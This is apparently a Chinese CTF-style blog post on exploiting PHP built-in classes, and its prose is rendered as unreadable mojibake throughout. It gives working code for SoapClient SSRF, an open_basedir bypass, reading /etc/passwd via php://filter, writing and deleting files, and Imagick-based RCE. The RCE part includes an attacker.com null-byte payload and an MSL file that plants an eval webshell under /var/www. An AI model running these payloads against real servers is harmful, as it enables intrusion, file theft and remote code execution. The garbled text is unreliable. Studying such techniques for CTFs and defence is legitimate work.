<p>è¿™é‡Œåªæä¾›ä¸€ä¸‹PHP8çš„é…ç½®æ–¹æ³•ï¼Œå› ä¸º7å’Œä»¥ä¸Šçš„ç‰ˆæœ¬é…ç½®çš„å†…å®¹æ˜¯ä¸ä¸€æ ·çš„</p>
<p>å…ˆæŠŠè·¯å¾„æ”¹ä¸€ä¸‹<img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250701160148997.png" alt="image-20250701160148997"></p>
<p>è¿™é‡Œåˆå§‹æ˜¯<code>ext</code>ï¼Œéœ€è¦æ”¹æ‰å¹¶ä¸”å»æ‰å‰é¢çš„;</p>
<p>å†æ‰¾åˆ°<code>soap</code></p>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250701160246768.png" alt="image-20250701160246768"></p>
<p>è¿™è¾¹ä¹Ÿéœ€è¦å»æ‰å‰é¢çš„;</p>
<p>è¿™æ ·å°±ç®—é…å¥½äº†ã€‚</p>
<h3 id="SoapClientä½•è®¸äººä¹Ÿ"><a href="#SoapClientä½•è®¸äººä¹Ÿ" class="headerlink" title="SoapClientä½•è®¸äººä¹Ÿ?"></a>SoapClientä½•è®¸äººä¹Ÿ?</h3><p>PHP çš„å†…ç½®ç±»<code> SoapClient</code> æ˜¯ä¸€ä¸ªä¸“é—¨ç”¨æ¥è®¿é—®webæœåŠ¡çš„ç±»ï¼Œå¯ä»¥æä¾›ä¸€ä¸ªåŸºäºSOAPåè®®è®¿é—®WebæœåŠ¡çš„ PHP å®¢æˆ·ç«¯ã€‚</p>
<p>ç±»æ‘˜è¦å¦‚ä¸‹ï¼š</p>
<pre><code class="highlight plaintext">SoapClient &#123;
    /* æ–¹æ³• */
    public __construct ( string|null $wsdl , array $options = [] )
    public __call ( string $name , array $args ) : mixed
    public __doRequest ( string $request , string $location , string $action , int $version , bool $oneWay = false ) : string|null
    public __getCookies ( ) : array
    public __getFunctions ( ) : array|null
    public __getLastRequest ( ) : string|null
    public __getLastRequestHeaders ( ) : string|null
    public __getLastResponse ( ) : string|null
    public __getLastResponseHeaders ( ) : string|null
    public __getTypes ( ) : array|null
    public __setCookie ( string $name , string|null $value = null ) : void
    public __setLocation ( string $location = &quot;&quot; ) : string|null
    public __setSoapHeaders ( SoapHeader|array|null $headers = null ) : bool
    public __soapCall ( string $name , array $args , array|null $options = null , SoapHeader|array|null $inputHeaders = null , array &amp;$outputHeaders = null ) : mixed
&#125;</code></pre>

<p>å¯ä»¥çœ‹åˆ°ï¼Œè¯¥å†…ç½®ç±»æœ‰ä¸€ä¸ª <code>__call</code> æ–¹æ³•ï¼Œå½“ <code>__call</code> æ–¹æ³•è¢«è§¦å‘åï¼Œå®ƒå¯ä»¥å‘é€ HTTP å’Œ HTTPS è¯·æ±‚ã€‚æ­£æ˜¯è¿™ä¸ª <code>__call</code> æ–¹æ³•ï¼Œä½¿å¾— <code>SoapClient</code> ç±»å¯ä»¥è¢«æˆ‘ä»¬è¿ç”¨åœ¨ SSRF ä¸­ã€‚<code>SoapClient</code> è¿™ä¸ªç±»ä¹Ÿç®—æ˜¯ç›®å‰è¢«æŒ–æ˜å‡ºæ¥æœ€å¥½ç”¨çš„ä¸€ä¸ªå†…ç½®ç±»ã€‚</p>
<p>è¯¥ç±»çš„æ„é€ å‡½æ•°å¦‚ä¸‹ï¼š</p>
<pre><code class="highlight plaintext">public SoapClient :: SoapClient(mixed $wsdl [ï¼Œarray $options ])</code></pre>

<ul>
<li>ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯ç”¨æ¥æŒ‡æ˜æ˜¯å¦æ˜¯<code>wsdl</code>æ¨¡å¼ï¼Œå°†è¯¥å€¼è®¾ä¸ºnullåˆ™è¡¨ç¤ºé<code>wsdl</code>æ¨¡å¼ã€‚</li>
<li>ç¬¬äºŒä¸ªå‚æ•°ä¸ºä¸€ä¸ªæ•°ç»„ï¼Œå¦‚æœåœ¨<code>wsdl</code>æ¨¡å¼ä¸‹ï¼Œæ­¤å‚æ•°å¯é€‰ï¼›å¦‚æœåœ¨é<code>wsdl</code>æ¨¡å¼ä¸‹ï¼Œåˆ™å¿…é¡»è®¾ç½®locationå’Œ<code>uri</code>é€‰é¡¹ï¼Œå…¶ä¸­<code>location</code>æ˜¯è¦å°†è¯·æ±‚å‘é€åˆ°çš„SOAPæœåŠ¡å™¨çš„URLï¼Œè€Œ<code>uri</code> æ˜¯SOAPæœåŠ¡çš„ç›®æ ‡å‘½åç©ºé—´ã€‚</li>
</ul>
<p>åœ¨çŸ¥é“ä¸¤ä¸ªé€‰é¡¹çš„å«ä¹‰ä¹‹åpayloadå°±ç›¸å½“å®¹æ˜“æ„é€ äº†</p>
<p><strong>è®¾ç½®ç¬¬ä¸€ä¸ªå‚æ•°ä¸ºnullï¼Œç¬¬äºŒä¸ªä¸º<code>target_url</code></strong></p>
<p>è¿™é‡Œå…¶å®å°±å¯ä»¥é…åˆ<strong>CRLF</strong>æˆ–è€…<strong>HTTPè¯·æ±‚èµ°ç§</strong>æä¸€ä¸‹</p>
<h2 id="open-basedirç»•è¿‡"><a href="#open-basedirç»•è¿‡" class="headerlink" title="open_basedirç»•è¿‡"></a><code>open_basedir</code>ç»•è¿‡</h2><p><code>DirectoryIterator</code>ä¸glob:&#x2F;&#x2F;åè®®ç»“åˆå°†æ— è§†<code>open_basedir</code>å¯¹ç›®å½•çš„é™åˆ¶ï¼Œå¯ä»¥ç”¨æ¥åˆ—ä¸¾å‡ºæŒ‡å®šç›®å½•ä¸‹çš„æ–‡ä»¶ã€‚</p>
<h2 id="å“ˆå¸Œæ¯”è¾ƒç»•è¿‡"><a href="#å“ˆå¸Œæ¯”è¾ƒç»•è¿‡" class="headerlink" title="å“ˆå¸Œæ¯”è¾ƒç»•è¿‡"></a>å“ˆå¸Œæ¯”è¾ƒç»•è¿‡</h2><p><code>Error</code>ç±»æ˜¯æ‰€æœ‰phpå†…éƒ¨é”™è¯¯ç±»çš„åŸºç±» ä»php7å¼€å§‹è¢«å¼•å…¥</p>
<p><code>Exception</code>ç±»æ˜¯æ‰€æœ‰å¼‚å¸¸çš„ç±»ï¼Œä»php5å¼€å§‹è¢«å¼•å…¥</p>
<p>è¿™ä¸¤ä¸ªéƒ½å­˜åœ¨<code>__tostring</code>æ–¹æ³•</p>
<p>é€šè¿‡echo&#x2F;returnå°±å¯ä»¥ç›´æ¥è§¦å‘</p>
<pre><code class="highlight php"><span class="meta">&lt;?php</span>
<span class="variable">$a</span> = <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">&quot;payload&quot;</span>,<span class="number">1</span>);<span class="variable">$b</span> = <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">&quot;payload&quot;</span>,<span class="number">2</span>);<span class="comment">//æ³¨æ„è¿™æ˜¯åŒä¸€è¡Œ</span>
<span class="keyword">echo</span> <span class="variable">$a</span>;
<span class="keyword">echo</span> <span class="variable">$b</span>;
<span class="keyword">if</span>(<span class="variable">$a</span> != <span class="variable">$b</span>)
&#123;
	<span class="keyword">echo</span> <span class="string">&quot;a!=b&quot;</span>;
&#125;
<span class="keyword">echo</span><span class="string">&quot;\n&quot;</span>;
<span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$a</span>)===<span class="title function_ invoke__">md5</span>(<span class="variable">$b</span>));<span class="comment">//è¿™é‡Œè¾“å‡ºæ˜¯true</span>
<span class="meta">?&gt;</span></code></pre>

<p>ä½†æ˜¯å¦‚æœè¿™æ ·å†™</p>
<pre><code class="highlight php"><span class="meta">&lt;?php</span>
<span class="variable">$a</span> = <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">&quot;payload&quot;</span>,<span class="number">1</span>);
<span class="variable">$b</span> = <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">&quot;payload&quot;</span>,<span class="number">2</span>);<span class="comment">//è¿™é‡Œä¸æ˜¯åŒä¸€è¡Œ</span>
<span class="keyword">echo</span> <span class="variable">$a</span>;
<span class="keyword">echo</span> <span class="variable">$b</span>;
<span class="keyword">if</span>(<span class="variable">$a</span> != <span class="variable">$b</span>)
&#123;
	<span class="keyword">echo</span> <span class="string">&quot;a!=b&quot;</span>;
&#125;
<span class="keyword">echo</span><span class="string">&quot;\n&quot;</span>;
<span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$a</span>)===<span class="title function_ invoke__">md5</span>(<span class="variable">$b</span>));<span class="comment">//è¿™é‡Œè¾“å‡ºçš„æ˜¯false</span>
<span class="meta">?&gt;</span></code></pre>

<p>è¿™æ˜¯ä¸ºä»€ä¹ˆå‘¢(é›¾)ï¼Œçœ‹ä¸€çœ¼è¾“å‡ºå°±å¯ä»¥å‘ç°å®ƒçš„è¿”å›å€¼æ˜¯å¸¦æœ‰è¡Œæ•°çš„ï¼Œè¿™ä¸ªå°±ä¼šå¯¼è‡´å“ˆå¸Œå€¼ä¸ä¸€æ ·</p>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250711143413796.png" alt="image-20250711143413796"></p>
<p>Exception ç±»ä¸ Error çš„ä½¿ç”¨å’Œç»“æœå®Œå…¨ä¸€æ ·ï¼Œåªä¸è¿‡ Exception ç±»é€‚ç”¨äºPHP 5å’Œ7ï¼Œè€Œ Error åªé€‚ç”¨äº PHP 7</p>
<h2 id="è¯»å†™æ–‡ä»¶"><a href="#è¯»å†™æ–‡ä»¶" class="headerlink" title="è¯»å†™æ–‡ä»¶"></a>è¯»å†™æ–‡ä»¶</h2><h3 id="SplFileObject"><a href="#SplFileObject" class="headerlink" title="SplFileObject"></a><code>SplFileObject</code></h3><p>è¿™ä¸ªæ˜¯æŒ‰è¡Œè¯»å–çš„ï¼Œå¦‚æœå¤šè¡Œè¯»å–å°±éœ€è¦éå†äº†</p>
<pre><code class="highlight php"><span class="meta">&lt;?php</span>
<span class="variable">$context</span> = <span class="keyword">new</span> <span class="built_in">SplFileObject</span>(<span class="string">&#x27;/etc/passwd&#x27;</span>);
<span class="keyword">foreach</span>(<span class="variable">$context</span> <span class="keyword">as</span> <span class="variable">$f</span>)&#123;
    <span class="keyword">echo</span>(<span class="variable">$f</span>);
&#125;
<span class="comment">// æˆ–è€…ç”¨ä¼ªåè®®base64ç›´æ¥è¾“å‡ºï¼Œæœ‰æ—¶å€™æœ‰å¥‡æ•ˆ</span>
<span class="variable">$context</span> = <span class="keyword">new</span> <span class="built_in">SplFileObject</span>(<span class="string">&#x27;php://filter/read=convert.base64-encode/resource=/etc/passwd&#x27;</span>);
<span class="keyword">echo</span> <span class="variable">$context</span>;</code></pre>

<p>å†™:</p>
<pre><code class="highlight plaintext">$f = new SplFileObject(&#x27;./file&#x27;, &quot;w&quot;);
$f-&gt;fwrite(&quot;file&quot;);</code></pre>

<h3 id="DOMDocumnet"><a href="#DOMDocumnet" class="headerlink" title="DOMDocumnet"></a>DOMDocumnet</h3><p>è¿™ä¸ªç±»æœ¬æ„æ˜¯å¤„ç† XML å’Œ HTML å†…å®¹ï¼Œä¸è¿‡ä¹Ÿæœ‰ç›¸åº”çš„è¯»&#x2F;å†™æ–‡ä»¶çš„æ–¹æ³•ï¼Œåªè¦åˆ©ç”¨ ä¼ªåè®® ç¨åšåŠ å·¥å°±å¯ä»¥æ— æ‚è´¨åœ°å¯¹æ•°æ®è¿›è¡Œæ“ä½œã€‚</p>
<p>è¯»æ–‡ä»¶:</p>
<pre><code class="highlight php"><span class="comment"># è¯»æ–‡ä»¶</span>
<span class="comment"># å…ˆç”¨ convert.base64 å°†æ–‡ä»¶å†…å®¹base64ï¼Œé¿å…å‡ºç°é¢å¤–çš„ &lt;p&gt; æ ‡ç­¾</span>
<span class="comment"># ç„¶åå°†è¯»å–çš„å†…å®¹è½¬æ¢æˆ XML æ ¼å¼ï¼Œå†åŠ è½½å®ƒï¼Œæœ€åå– &lt;p&gt; æ ‡ç­¾å†…çš„å†…å®¹ (å¦‚æœæƒ³è·å–çº¯å‡€æµåˆ™å¯ä»¥å†è¿›è¡Œbase64è§£ç )</span>
<span class="variable">$f</span>=<span class="string">&quot;/etc/passwd&quot;</span>;
<span class="variable">$d</span>=<span class="keyword">new</span> <span class="title class_">DOMDocument</span>();
<span class="variable">$d</span>-&gt;<span class="title function_ invoke__">loadHTMLFile</span>(<span class="string">&quot;php://filter/convert.base64-encode/resource=<span class="subst">$f</span>&quot;</span>);
<span class="variable">$d</span>-&gt;<span class="title function_ invoke__">loadXML</span>(<span class="variable">$d</span>-&gt;<span class="title function_ invoke__">saveXML</span>());
<span class="keyword">echo</span> <span class="variable">$d</span>-&gt;<span class="title function_ invoke__">getElementsByTagName</span>(<span class="string">&quot;p&quot;</span>)[<span class="number">0</span>]-&gt;textContent;</code></pre>

<p>å†™æ–‡ä»¶</p>
<pre><code class="highlight php"><span class="comment"># å†™æ–‡ä»¶</span>
<span class="comment"># å…ˆç”¨ string.strip_tags å°†å¤šä½™çš„ HTML æ ‡ç­¾å»æ‰ï¼Œç„¶åå†ç”¨ convert.base64 å°†å¤šä½™çš„å…¶ä»–æ‚è´¨ (å¦‚ç©ºæ ¼ï¼ŒåŒå¼•å·ç­‰ébase64å­—ç¬¦å»æ‰)</span>
<span class="variable">$f</span>=<span class="string">&quot;./test.php&quot;</span>;
<span class="variable">$d</span>=<span class="keyword">new</span> <span class="title class_">DOMDocument</span>();
<span class="variable">$d</span>-&gt;<span class="title function_ invoke__">loadHTML</span>(<span class="string">&quot;dGVzdA==&quot;</span>);
<span class="variable">$d</span>-&gt;<span class="title function_ invoke__">saveHtmlFile</span>(<span class="string">&quot;php://filter/string.strip_tags|convert.base64-decode/resource=<span class="subst">$f</span>&quot;</span>);</code></pre>

<p>è¯»æ–‡ä»¶ï¼š<code>Xinclude</code></p>
<pre><code class="highlight plaintext">&lt;?php $a = filter_input(1,&quot;file&quot;);; $xml = &lt;&lt;&lt;EOD &lt;?xml version=&quot;1.0&quot; ?&gt; &lt;root xmlns:xi=&quot;http://www.w3.org/2001/XInclude&quot;&gt; &lt;xi:include href=&quot;$a&quot; parse=&quot;text&quot;/&gt; &lt;/root&gt; EOD; $dom = new DOMDocument; $dom-&gt;preserveWhiteSpace = false; $dom-&gt;formatOutput = true; $dom-&gt;loadXML($xml); $dom-&gt;xinclude(); echo $dom-&gt;saveXML();</code></pre>

<h2 id="æ–‡ä»¶æ¢æµ‹"><a href="#æ–‡ä»¶æ¢æµ‹" class="headerlink" title="æ–‡ä»¶æ¢æµ‹"></a>æ–‡ä»¶æ¢æµ‹</h2><h3 id="æ–‡ä»¶æ˜¯å¦å­˜åœ¨-finfo"><a href="#æ–‡ä»¶æ˜¯å¦å­˜åœ¨-finfo" class="headerlink" title="æ–‡ä»¶æ˜¯å¦å­˜åœ¨(finfo)"></a>æ–‡ä»¶æ˜¯å¦å­˜åœ¨(<code>finfo</code>)</h3><p>åˆ©ç”¨ç‰ˆæœ¬: (PHP &gt;&#x3D; 5.3.0, PECL <code>fileinfo</code> &gt;&#x3D; 0.1.0) åˆ¤æ–­æ–‡ä»¶æ˜¯å¦å­˜åœ¨(åˆ¤æ–­æ–‡ä»¶ç±»å‹)</p>
<pre><code class="highlight php"><span class="variable">$f</span> = <span class="string">&quot;./aasd.php&quot;</span>; <span class="variable">$ff</span> = <span class="keyword">new</span> <span class="title function_ invoke__">finfo</span>(FILEINFO_MIME); <span class="keyword">echo</span> <span class="variable">$ff</span>-&gt;<span class="title function_ invoke__">file</span>(<span class="variable">$f</span>);</code></pre>

<h3 id="ç›®å½•éå†-Directory"><a href="#ç›®å½•éå†-Directory" class="headerlink" title="ç›®å½•éå†:Directory"></a>ç›®å½•éå†:Directory</h3><p>è¿™ä¸ªç±»æœ¬æ„æ˜¯ä¸èƒ½å¤Ÿç›´æ¥é€šè¿‡ new æ–¹å¼è¿›è¡Œåˆ›å»ºåˆ©ç”¨ï¼Œå½“ä½¿ç”¨ dir å‡½æ•°æ—¶ï¼Œè¿™ä¸ªç±»ä¼šè¢«å®ä¾‹åŒ–ã€‚ä½†æˆ‘ä»¬ä¾ç„¶å¯ä»¥ç›´æ¥å®ä¾‹åŒ–å¹¶ä½¿ç”¨å…¶ä¸­çš„æ–¹æ³•</p>
<p><strong>åˆ¤æ–­æ–‡ä»¶æ˜¯å¦å­˜åœ¨:</strong></p>
<pre><code class="highlight php"><span class="comment"># åˆ¤æ–­æŸä¸ªç›®å½•æ˜¯å¦å­˜åœ¨ï¼Œ</span>
<span class="comment"># å¦‚æœå­˜åœ¨è¿”å›ç›®å½•å­—ç¬¦ä¸²ï¼Œè‹¥ä¸å­˜åœ¨åˆ™äº§ç”Ÿè­¦å‘Šå¹¶è¿”å›NULL</span>
<span class="variable">$dir</span>=<span class="string">&quot;/etc&quot;</span>;
<span class="keyword">echo</span> (<span class="keyword">new</span> <span class="built_in">Directory</span>)-&gt;<span class="title function_ invoke__">read</span>(<span class="title function_ invoke__">opendir</span>(<span class="variable">$dir</span>));</code></pre>

<p><strong>è¯»å–ç›®å½•:</strong></p>
<pre><code class="highlight php"><span class="variable">$dir</span> = <span class="string">&quot;/etc&quot;</span>;
<span class="variable">$d</span> = <span class="keyword">new</span> <span class="built_in">Directory</span>;
<span class="variable">$d</span>-&gt;resource = <span class="title function_ invoke__">opendir</span>(<span class="variable">$dir</span>);
<span class="keyword">while</span>((<span class="variable">$c</span> = <span class="variable">$d</span>-&gt;<span class="title function_ invoke__">read</span>(<span class="variable">$d</span>-&gt;resource)))&#123;<span class="keyword">echo</span> <span class="variable">$c</span>.<span class="string">&quot;\n&quot;</span>;&#125;;</code></pre>



<h3 id="ç›®å½•éå†-DirectoryIterator"><a href="#ç›®å½•éå†-DirectoryIterator" class="headerlink" title="ç›®å½•éå†:DirectoryIterator"></a>ç›®å½•éå†:<code>DirectoryIterator</code></h3><p><code>DirectoryIterator</code> ä¼šåˆ›å»ºä¸€ä¸ªæŒ‡å®šç›®å½•çš„è¿­ä»£å™¨ã€‚å½“æ‰§è¡Œåˆ°echoå‡½æ•°æ—¶ï¼Œä¼šè§¦å‘<code>DirectoryIterator</code>ç±»ä¸­çš„ <code>__toString()</code> æ–¹æ³•ï¼Œè¾“å‡ºæŒ‡å®šç›®å½•é‡Œé¢ç»è¿‡æ’åºä¹‹åçš„ç¬¬ä¸€ä¸ªæ–‡ä»¶å.</p>
<p>éå†æ–‡ä»¶ç›®å½•,ç›´æ¥å¯¹æ–‡ä»¶å…¨éƒ¨è¾“å‡ºå‡ºæ¥.</p>
<pre><code class="highlight plaintext">&lt;?php $dir=new DirectoryIterator(&quot;/&quot;); foreach($dir as $f)&#123;    echo($f.&#x27;&lt;br&gt;&#x27;);    //echo($f-&gt;__toString().&#x27;&lt;br&gt;&#x27;); &#125;</code></pre>

<p>åˆ©ç”¨<code> DirectoryIterator</code> ç±»å¯¹è±¡ + glob:&#x2F;&#x2F; åè®®è·å–ç›®å½•ç»“æ„ï¼Œèƒ½å¤Ÿçªç ´ <code>open_basedir</code> çš„é™åˆ¶ï¼š</p>
<pre><code class="highlight plaintext">$dir=new DirectoryIterator(&quot;glob:///*&quot;); foreach($dir as $f)&#123;    echo($f.&#x27;&lt;br&gt;&#x27;);    //echo($f-&gt;__toString().&#x27;&lt;br&gt;&#x27;); &#125;</code></pre>

<p>ä¸€äº›å…¶ä»–çš„ç”¨æ³•ï¼š</p>
<pre><code class="highlight plaintext"># ç®€å•åˆ—ç›®å½•
$dir = &quot;./geek&quot;;
$d = new DirectoryIterator($dir);
while ($d-&gt;valid())&#123;
    echo $d.&quot;\n&quot;;
    $d-&gt;next();
&#125;

# ä¹Ÿå¯ä»¥ç”¨æ¥è·å–æ–‡ä»¶çš„ä¿¡æ¯
$dir = &quot;./geek&quot;;
$d = new DirectoryIterator($dir);
while($d-&gt;valid())&#123;

    # è·å–æœ€åè®¿é—®æ—¶é—´
    var_dump($d-&gt;getATime());
    # è·å–åˆ›å»ºæ—¶é—´
    var_dump($d-&gt;getCTime());
    # è·å–æœ€åä¿®æ”¹æ—¶é—´
    var_dump($d-&gt;getMtime());
    # è·å–æ–‡ä»¶åï¼Œ
    # ç›´æ¥ç”¨ __toString ä¹Ÿå¯ä»¥
    var_dump($d-&gt;getFilename());
    var_dump((string)$d);
    # è·å–æ–‡ä»¶å (è‡ªåŠ¨é™¤å»åç¼€å)ï¼Œ
    # æ¯”å¦‚é™¤å» .php åç¼€å
    var_dump($d-&gt;getBasename(&quot;php&quot;));
    # è·å–ç›®å½•å’Œæ–‡ä»¶å
    var_dump($d-&gt;getPathname());
    # è·å–æ–‡ä»¶æ‰€æœ‰è€…
    var_dump($d-&gt;getOwner());
    # è·å–æ–‡ä»¶æ‰€æœ‰ç»„
    var_dump($d-&gt;getGroup());
    # è·å–æ–‡ä»¶inodeç¼–å·
    var_dump($d-&gt;getInode());
    # è·å–æ–‡ä»¶æƒé™
    var_dump(substr(sprintf(&quot;%o&quot;,$d-&gt;getPerms()),-4));
    # è·å–æ–‡ä»¶å¤§å°
    var_dump(($d-&gt;getSize()/1024).&quot; kb&quot;);
    # è·å–æ–‡ä»¶ç±»å‹ (file/dir)
    var_dump($d-&gt;getType());
    # åˆ¤æ–­æ–‡ä»¶æ˜¯å¦æ˜¯ç›®å½•
    var_dump($d-&gt;isDir());
    # åˆ¤æ–­æ–‡ä»¶æ˜¯å¦æ˜¯æ–‡ä»¶ (ä¸æ˜¯ç›®å½•)
    var_dump($d-&gt;isFile());
    # åˆ¤æ–­æ–‡ä»¶æ˜¯å¦ä¸º ./..
    var_dump($d-&gt;isDot());
    # åˆ¤æ–­æ–‡ä»¶æ˜¯å¦å¯æ‰§è¡Œ
    var_dump($d-&gt;isExecute());
    # åˆ¤æ–­æ–‡ä»¶æ˜¯å¦æ˜¯é“¾æ¥æ–‡ä»¶
    var_dump($d-&gt;isLink());
    # åˆ¤æ–­æ–‡ä»¶æ˜¯å¦å¯è¯»
    var_dump($d-&gt;isReadable());
    # åˆ¤æ–­æ–‡ä»¶æ˜¯å¦å¯å†™
    var_dump($d-&gt;isWriteable());

    $d-&gt;next();
&#125;

# ä¸€äº›å…¶ä»–æ–¹æ³•çš„åŠŸèƒ½
# è·å–å½“å‰ç›®å½•è·¯å¾„ (å…¶å®ä¹Ÿå°±æ˜¯ ? )
var_dump($d-&gt;path());
# è·å–å½“å‰å…ƒç´ çš„ç´¢å¼•
var_dump($d-&gt;key());
# å°†å½“å‰ç´¢å¼•ç§»åŠ¨åˆ°ä¸‹ä¸€ä¸ªå…ƒç´ 
$d-&gt;next();
# å°†ç´¢å¼•é‡ç½®åˆ°å¼€å¤´
$d-&gt;rewind();
# è®¾ç½®ç´¢å¼•
$d-&gt;seek(0);
# åˆ¤æ–­å½“å‰ç´¢å¼•çš„æ–‡ä»¶æ˜¯å¦åˆæ³• (æ˜¯å¦æ˜¯ä¸€ä¸ªæ–‡ä»¶)
$d-&gt;vaild();
</code></pre>

<h3 id="ç›®å½•éå†-FilesystemIterator"><a href="#ç›®å½•éå†-FilesystemIterator" class="headerlink" title="ç›®å½•éå†:FilesystemIterator"></a>ç›®å½•éå†:<code>FilesystemIterator</code></h3><p>åˆ©ç”¨ç‰ˆæœ¬ï¼š(PHP 5 &gt;&#x3D; 5.3.0, PHP 7)</p>
<p>å…¶å®è¿™ä¸ªç±»å®é™…ä¸Šä¹Ÿå°±æ˜¯ <code>DirectoryIterator</code> ç±»çš„å‡çº§ç‰ˆï¼ŒåŸºæœ¬ç»§æ‰¿äº†<code> DirectorIterator</code> ç±»çš„æ‰€æœ‰æ–¹æ³•ï¼Œæ‰€ä»¥åˆ©ç”¨æ–¹å¼å’Œ <code>DirectorIterator</code> ä¸€æ ·:</p>
<h3 id="ç›®å½•éå†-GlobIterator"><a href="#ç›®å½•éå†-GlobIterator" class="headerlink" title="ç›®å½•éå†:GlobIterator"></a>ç›®å½•éå†:<code>GlobIterator</code></h3><p>åˆ©ç”¨ç‰ˆæœ¬ï¼š(PHP 5 &gt;&#x3D; 5.3.0, PHP 7)<code>GlobIterator</code>æ— éœ€é…åˆ glob:&#x2F;&#x2F; åè®®æšä¸¾ç›®å½•ã€‚</p>
<pre><code class="highlight plaintext">foreach(new GlobIterator(&quot;./*&quot;) as $f)&#123;    echo $f.&quot;\n&quot;; &#125;</code></pre>

<p>åœ¨ CTF ä¸­å¦‚æœçŸ¥é“äº† flag çš„ä½ç½®ï¼Œä½†ä¸çŸ¥é“ flag çš„æ–‡ä»¶åï¼Œåˆ™å¯ä»¥ä½¿ç”¨:<code>GlobIterator(&quot;/*flag*&quot;)</code></p>
<h3 id="æ–‡ä»¶æ“ä½œ-ZipArchive"><a href="#æ–‡ä»¶æ“ä½œ-ZipArchive" class="headerlink" title="æ–‡ä»¶æ“ä½œ:ZipArchive"></a>æ–‡ä»¶æ“ä½œ:ZipArchive</h3><p>åˆ©ç”¨ç‰ˆæœ¬: (PHP 5 &gt;&#x3D; 5.2.0, PHP 7, PECL zip &gt;&#x3D; 1.1.0)</p>
<p>è¿™ä¸ªç±»æ˜¯åœ¨php5.2.0ä¹‹åå¼•å…¥çš„ï¼Œæˆ‘ä»¬ä¹‹å‰ä¼šåœ¨ä¸€äº›åŸç”Ÿç±»åˆ©ç”¨ä¸­è§åˆ°å®ƒï¼Œæˆ‘ä»¬å¯ä»¥ç”¨è¿™ä¸ªç±»æ¥åˆ é™¤æ–‡ä»¶ï¼Œè¯»å–æ–‡ä»¶ä»¥åŠæœ‰æŸå†™æ–‡ä»¶ã€‚</p>
<p><strong>åˆ é™¤æ–‡ä»¶</strong></p>
<pre><code class="highlight plaintext">$a=new ZipArchive();
$a-&gt;open(&quot;file&quot;, ZipArchive::OVERWRITE); // ZipArchive::CREATEä¹Ÿå¯ä»¥ç”¨8ä»£æ›¿</code></pre>

<p><strong>è¯»å–æ–‡ä»¶</strong></p>
<pre><code class="highlight plaintext">$f = &quot;flag&quot;;
$zip=new ZipArchive();
$zip-&gt;open(&quot;a.zip&quot;, ZipArchive::CREATE);
$zip-&gt;addFile($f);
$zip-&gt;close();
$zip-&gt;open(&quot;a.zip&quot;);
echo $zip-&gt;getFromName($f);
$zip-&gt;close();</code></pre>

<p><strong>æœ‰æŸå†™æ–‡ä»¶</strong></p>
<pre><code class="highlight plaintext">$f = &quot;flag&quot;;
$zip=new ZipArchive();
$zip-&gt;open(&quot;a.zip&quot;, ZipArchive::CREATE);
$zip-&gt;setArchiveComment(&quot;&lt;?php phpinfo();?&gt;&quot;);
$zip-&gt;addFromString(&quot;file&quot;, &quot;&quot;);
$zip-&gt;close();
//include &quot;a.zip&quot;;</code></pre>

<h2 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h2><p><a href="https://swarm.ptsecurity.com/exploiting-arbitrary-object-instantiations/">Exploiting Arbitrary Object Instantiations in PHP without Custom Classes â€“ PT SWARM</a> è¿™ç¯‡æ–‡ç« çš„ä½œè€…åœ¨åº”å¯¹å¦‚ä¸‹åœºæ™¯æ—¶æ‰¾åˆ°äº†ä¸€ç§æ–°çš„åˆ©ç”¨æ‰‹æ³•â€”â€”Imagickã€‚</p>
<pre><code class="highlight plaintext">new $_GET[&#x27;a&#x27;]($_GET[&#x27;b&#x27;]);</code></pre>

<p>å¦‚æœä»…å¯æ§ç±»åå’Œä¸€ä¸ªå‚æ•°åï¼Œä¸”åªèƒ½å¤Ÿå®ä¾‹åŒ–å¯¹è±¡ï¼Œä¸èƒ½æ‰§è¡Œå¯¹è±¡æ–¹æ³•çš„æƒ…å†µä¸‹ï¼ŒåŒæ ·å¯ä»¥å®ç° RCEã€‚</p>
<h3 id="ç©ºå­—èŠ‚æˆªæ–­"><a href="#ç©ºå­—èŠ‚æˆªæ–­" class="headerlink" title="ç©ºå­—èŠ‚æˆªæ–­"></a>ç©ºå­—èŠ‚æˆªæ–­</h3><p>Imagick å‚æ•°è¢«ç©ºå­—èŠ‚æˆªæ–­ä¹Ÿå¯ä»¥æ­£å¸¸ä½¿ç”¨</p>
<pre><code class="highlight plaintext"># No errors $a = new Imagick(&quot;/tmp/positive.png\x00.jpg&quot;); # No errors $a = new Imagick(&quot;http://attacker.com/test\x00test&quot;);</code></pre>

<h3 id="https"><a href="#https" class="headerlink" title="https:&#x2F;"></a>https:&#x2F;</h3><p>https:&#x2F; ä¼šè°ƒç”¨ curl</p>
<pre><code class="highlight plaintext">$a = new Imagick(&quot;https:/127.0.0.1:9999/positive.png\x00.jpg&quot;);</code></pre>

<h3 id="vid-tempfile-RCE"><a href="#vid-tempfile-RCE" class="headerlink" title="vid + tempfile RCE"></a>vid + tempfile RCE</h3><p>php ä¼šå°† post æ¥æ”¶åˆ°çš„æ–‡ä»¶ä»¥ä¸´æ—¶æ–‡ä»¶çš„å½¢å¼ä¿å­˜åœ¨ &#x2F;tmp ä¸‹ã€‚å‡è®¾æˆ‘ä»¬ä¸Šä¼ ä¸€ä¸ª msl æ–‡ä»¶å¦‚ä¸‹</p>
<pre><code class="highlight plaintext">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt; &lt;image&gt; &lt;read filename=&quot;caption:&lt;?php @eval(@$_REQUEST[&#x27;a&#x27;]); ?&gt;&quot; /&gt; &lt;!-- Relative paths such as info:./../../uploads/swarm.php can be used as well --&gt; &lt;write filename=&quot;info:/var/www/swarm.php&quot; /&gt; &lt;/image&gt;</code></pre>

